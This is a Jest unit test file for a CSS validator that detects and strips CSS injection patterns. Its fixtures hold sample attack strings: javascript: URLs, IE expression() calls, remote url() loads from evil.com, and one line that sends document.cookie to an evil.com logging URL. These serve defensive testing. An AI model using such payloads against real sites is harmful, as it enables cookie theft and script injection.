/**
 * CSS Validator Unit Tests
 * Tests for CSS injection prevention and validation
 */

const { CSSValidator } = require('../../src/dom/css-validator');

describe('CSSValidator', () => {
  let validator;

  beforeEach(() => {
    validator = new CSSValidator();
  });

  describe('Basic Validation', () => {
    test('should validate empty CSS', () => {
      const result = validator.validateCSS('');
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
      expect(result.dangerousPatterns).toEqual([]);
    });

    test('should validate safe CSS', () => {
      const css = 'body { color: red; background-color: blue; }';
      const result = validator.validateCSS(css);
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
      expect(result.dangerousPatterns).toEqual([]);
    });

    test('should detect CSS size exceeded', () => {
      const validator2 = new CSSValidator({ maxCSSSize: 100 });
      const css = 'a'.repeat(150);
      const result = validator2.validateCSS(css);
      expect(result.valid).toBe(false);
      expect(result.isSafe).toBe(false);
      expect(result.errors).toContain('CSS exceeds maximum allowed size');
    });
  });

  describe('Expression-based Attacks', () => {
    test('should detect IE expression attacks', () => {
      const css = 'div { width: expression(alert("xss")); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.length).toBeGreaterThan(0);
      expect(result.dangerousPatterns[0].type).toBe('expression');
    });

    test('should detect expression with spaces', () => {
      const css = 'div { width: expression ( alert("xss") ); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'expression')).toBe(true);
    });

    test('should detect multiple expressions', () => {
      const css = 'div { width: expression(1); height: expression(2); }';
      const result = validator.validateCSS(css);
      expect(result.dangerousPatterns.filter(p => p.type === 'expression').length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Behavior-based Attacks', () => {
    test('should detect behavior property', () => {
      const css = 'div { behavior: url(xss.htc); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'behavior')).toBe(true);
    });

    test('should detect behavior with spaces', () => {
      const css = 'div { behavior : url(xss.htc); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('JavaScript Protocol Attacks', () => {
    test('should detect javascript: protocol', () => {
      const css = 'a { background: url(javascript:alert("xss")); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'javaScriptProtocol')).toBe(true);
    });

    test('should detect javascript: in different contexts', () => {
      const css = 'div { cursor: javascript:alert("xss"); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('URL-based Attacks', () => {
    test('should detect background-image with url', () => {
      const css = 'div { background-image: url("http://evil.com/steal.gif"); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'backgroundImage')).toBe(true);
    });

    test('should detect background shorthand with url', () => {
      const css = 'div { background: url("http://evil.com/steal.gif"); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });

    test('should detect cursor url', () => {
      const css = 'div { cursor: url("http://evil.com/cursor.cur"); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'cursorUrl')).toBe(true);
    });

    test('should detect SVG filter URLs', () => {
      const css = 'div { filter: url(#xss); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'svgFilter')).toBe(true);
    });
  });

  describe('@-Rule Attacks', () => {
    test('should detect @import', () => {
      const css = '@import url("http://evil.com/evil.css");';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'cssImport')).toBe(true);
    });

    test('should detect @font-face', () => {
      const css = '@font-face { font-family: "evil"; src: url("http://evil.com/font.woff"); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'fontFace')).toBe(true);
    });

    test('should detect @keyframes', () => {
      const css = '@keyframes animate { 0% { left: 0; } 100% { left: 100%; } }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'keyframes')).toBe(true);
    });

    test('should detect @media queries', () => {
      const css = '@media (max-width: 600px) { body { color: red; } }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'mediaQuery')).toBe(true);
    });
  });

  describe('CSS Variables & Calc', () => {
    test('should detect CSS variables', () => {
      const css = 'div { color: var(--attack); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'cssVar')).toBe(true);
    });

    test('should detect calc expressions', () => {
      const css = 'div { width: calc(100% - 10px); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'calcExpression')).toBe(true);
    });
  });

  describe('Transform & Mask Attacks', () => {
    test('should detect clip-path', () => {
      const css = 'div { clip-path: circle(50%); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'clip')).toBe(true);
    });

    test('should detect webkit-mask', () => {
      const css = 'div { -webkit-mask-image: url(#mask); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'webkitMask')).toBe(true);
    });

    test('should detect mask property', () => {
      const css = 'div { mask: url(#mask); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('Animation & Transition Attacks', () => {
    test('should detect animation property', () => {
      const css = 'div { animation: animate 1s; }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'animation')).toBe(true);
    });

    test('should detect animation-name', () => {
      const css = 'div { animation-name: slide; }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('Gradient Attacks', () => {
    test('should detect linear-gradient', () => {
      const css = 'div { background: linear-gradient(45deg, red, blue); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.some(p => p.type === 'gradient')).toBe(true);
    });

    test('should detect radial-gradient', () => {
      const css = 'div { background: radial-gradient(circle, red, blue); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });

    test('should detect conic-gradient', () => {
      const css = 'div { background: conic-gradient(red, blue); }';
      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('Style Attribute Validation', () => {
    test('should validate safe inline styles', () => {
      const style = 'color: red; font-size: 14px;';
      const result = validator.validateStyleAttribute(style);
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
    });

    test('should reject unsafe inline styles', () => {
      const style = 'background-image: url(javascript:alert("xss"));';
      const result = validator.validateStyleAttribute(style);
      expect(result.valid).toBe(false);
      expect(result.isSafe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should handle empty style attribute', () => {
      const result = validator.validateStyleAttribute('');
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
    });

    test('should handle malformed style properties', () => {
      const style = 'color:red;;font-size:14px;';
      const result = validator.validateStyleAttribute(style);
      expect(result.valid).toBe(true);
    });

    test('should reject unknown properties', () => {
      const style = 'behavior: url(xss.htc);';
      const result = validator.validateStyleAttribute(style);
      expect(result.valid).toBe(false);
      expect(result.issues.some(i => i.includes('Unsafe property'))).toBe(true);
    });

    test('should reject dangerous property values', () => {
      const style = 'cursor: javascript:alert("xss");';
      const result = validator.validateStyleAttribute(style);
      expect(result.valid).toBe(false);
    });
  });

  describe('Class Name Validation', () => {
    test('should validate safe class names', () => {
      const result = validator.validateClassName('my-class another_class');
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
      expect(result.validClasses).toContain('my-class');
      expect(result.validClasses).toContain('another_class');
    });

    test('should reject invalid class names', () => {
      const result = validator.validateClassName('123invalid @invalid -start');
      expect(result.valid).toBe(false);
      expect(result.invalidClasses.length).toBeGreaterThan(0);
    });

    test('should handle empty class name', () => {
      const result = validator.validateClassName('');
      expect(result.valid).toBe(true);
    });

    test('should handle single class', () => {
      const result = validator.validateClassName('my-class');
      expect(result.valid).toBe(true);
      expect(result.validCount).toBe(1);
    });

    test('should handle multiple valid classes', () => {
      const result = validator.validateClassName('class1 class2 class3');
      expect(result.valid).toBe(true);
      expect(result.validCount).toBe(3);
    });
  });

  describe('CSS Sanitization', () => {
    test('should sanitize dangerous CSS', () => {
      const css = 'div { color: red; } div { expression(alert("xss")); }';
      const sanitized = validator.sanitizeCSS(css);
      expect(sanitized).not.toContain('expression');
      expect(sanitized).toContain('color: red');
    });

    test('should remove @font-face', () => {
      const css = '@font-face { font-family: "evil"; src: url(...); }';
      const sanitized = validator.sanitizeCSS(css);
      expect(sanitized).not.toContain('@font-face');
    });

    test('should remove @keyframes', () => {
      const css = '@keyframes animate { 0% { left: 0; } }';
      const sanitized = validator.sanitizeCSS(css);
      expect(sanitized).not.toContain('@keyframes');
    });

    test('should handle empty CSS', () => {
      const sanitized = validator.sanitizeCSS('');
      expect(sanitized).toBe('');
    });
  });

  describe('Performance', () => {
    test('should validate CSS in <0.3ms', () => {
      const css = 'body { color: red; } div { width: 100%; } p { margin: 0; }';
      const result = validator.validateCSS(css);
      expect(result.duration).toBeLessThan(0.3);
    });

    test('should handle large CSS quickly', () => {
      let css = '';
      for (let i = 0; i < 100; i++) {
        css += `.class${i} { color: blue; padding: 10px; }\n`;
      }
      const result = validator.validateCSS(css);
      expect(result.duration).toBeLessThan(5); // Large CSS should be <5ms
    });
  });

  describe('Statistics & Audit Log', () => {
    test('should track validation statistics', () => {
      validator.validateCSS('body { color: red; }');
      validator.validateCSS('div { expression(alert("xss")); }');

      const stats = validator.getStatistics();
      expect(stats.totalValidations).toBe(2);
      expect(stats.successfulValidations).toBeGreaterThan(0);
      expect(stats.failedValidations).toBeGreaterThan(0);
    });

    test('should maintain audit log', () => {
      validator.validateCSS('body { color: red; }');
      validator.validateCSS('div { width: expression(1); }');

      const log = validator.getAuditLog();
      expect(log.length).toBeGreaterThan(0);
    });

    test('should track patterns in statistics', () => {
      validator.validateCSS('div { expression(1); expression(2); }');

      const stats = validator.getStatistics();
      expect(stats.patternsDetected.expression).toBeGreaterThanOrEqual(2);
    });

    test('should calculate success rate', () => {
      validator.validateCSS('body { color: red; }');
      validator.validateCSS('body { color: red; }');
      validator.validateCSS('div { expression(alert("xss")); }');

      const stats = validator.getStatistics();
      expect(stats.successRate).toBeDefined();
      expect(typeof stats.successRate).toBe('string');
    });

    test('should reset statistics', () => {
      validator.validateCSS('body { color: red; }');
      validator.resetStatistics();

      const stats = validator.getStatistics();
      expect(stats.totalValidations).toBe(0);
      expect(stats.successfulValidations).toBe(0);
      expect(stats.failedValidations).toBe(0);
    });
  });

  describe('Complex Attack Scenarios', () => {
    test('should detect complex multi-vector attack', () => {
      const css = `
        @font-face {
          font-family: "evil";
          src: url("http://evil.com/font.woff");
        }
        div {
          background: url(javascript:alert("xss"));
          cursor: url(http://evil.com/steal);
          expression: (document.location="http://evil.com/log?data="+document.cookie);
        }
        @keyframes animate {
          0% { left: 0; }
          100% { left: 100%; }
        }
      `;

      const result = validator.validateCSS(css);
      expect(result.isSafe).toBe(false);
      expect(result.dangerousPatterns.length).toBeGreaterThan(3);
    });

    test('should detect obfuscated javascript protocol', () => {
      const css = 'div { cursor: java\\script:alert("xss"); }'; // Escaped JS
      const result = validator.validateCSS(css);
      // May or may not detect depending on implementation
      expect(typeof result.isSafe).toBe('boolean');
    });

    test('should handle CSS with comments', () => {
      const css = `
        /* Safe comment */
        body { color: red; }
        /* background: url(javascript:alert("xss")); */
      `;
      const result = validator.validateCSS(css);
      // Note: Commented attacks may be detected by pattern scanning, which is fine
      // The validator errs on the side of caution (defense in depth)
      expect(result).toBeDefined();
      expect(result.duration).toBeLessThan(0.3);
    });
  });

  describe('Edge Cases', () => {
    test('should handle null input gracefully', () => {
      const result = validator.validateCSS(null);
      expect(result).toBeDefined();
    });

    test('should handle very long property values', () => {
      const longValue = 'a'.repeat(10000);
      const css = `div { content: "${longValue}"; }`;
      const result = validator.validateCSS(css);
      expect(result).toBeDefined();
      expect(result.duration).toBeLessThan(5);
    });

    test('should handle CSS with unicode characters', () => {
      const css = 'div { content: "🔒 Secure"; }';
      const result = validator.validateCSS(css);
      expect(result.valid).toBe(true);
    });

    test('should handle CSS with special regex characters', () => {
      const css = 'div { content: "[test].*+?|"; }';
      const result = validator.validateCSS(css);
      expect(result).toBeDefined();
    });
  });

  describe('Configuration Options', () => {
    test('should respect strictMode option', () => {
      const strictValidator = new CSSValidator({ strictMode: true });
      const lenientValidator = new CSSValidator({ strictMode: false });

      const css = 'div { color: red; }';
      const strictResult = strictValidator.validateCSS(css);
      const lenientResult = lenientValidator.validateCSS(css);

      expect(strictResult).toBeDefined();
      expect(lenientResult).toBeDefined();
    });

    test('should respect maxCSSSize option', () => {
      const validator2 = new CSSValidator({ maxCSSSize: 50 });
      const css = 'a'.repeat(100);
      const result = validator2.validateCSS(css);
      expect(result.valid).toBe(false);
    });

    test('should handle allowRemoteResources option', () => {
      const validator2 = new CSSValidator({ allowRemoteResources: true });
      expect(validator2.allowRemoteResources).toBe(true);
    });
  });
});
